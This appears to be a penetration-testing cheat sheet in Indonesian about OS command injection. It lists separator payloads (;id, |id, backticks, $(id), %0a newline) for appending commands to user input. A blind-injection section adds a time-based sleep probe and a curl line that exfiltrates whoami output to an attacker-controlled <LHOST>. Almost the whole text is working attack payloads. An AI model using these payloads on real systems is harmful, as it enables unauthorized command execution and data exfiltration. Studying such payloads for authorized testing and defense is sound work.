# Command Injection

## Separator (sisipkan setelah input)
```bash
;id        # Semicolon (Titik koma, mengeksekusi perintah setelahnya)
|id        # Pipe (Meneruskan output, sering mengabaikan perintah awal)
||id       # OR (Dieksekusi HANYA jika perintah pertama GAGAL)
&id        # Background (Menjalankan perintah di latar belakang)
&&id       # AND (Dieksekusi HANYA jika perintah pertama BERHASIL)
`id`       # Backticks (Inline execution, mengeksekusi perintah di dalamnya lebih dulu)
$(id)      # Command substitution (Fungsinya sama persis seperti backticks)
%0aid      # URL-encoded Newline (Bypass filter dengan karakter enter/baris baru)
;id;       # Inline Semicolon (Menyisipkan perintah di tengah-tengah query target)
|id|       # Inline Pipe (Sama seperti semicolon, mengeksekusi di antara pipe)
```

## Blind (no output)
Exfil via DNS/HTTP atau time-based:
```bash
;sleep 5                           # Time-based: Jika web loading lambat (5 detik), target rentan.
;curl http://<LHOST>/$(whoami)     # Exfil HTTP: Mengirim hasil eksekusi (whoami) ke IP Kali kita.
```
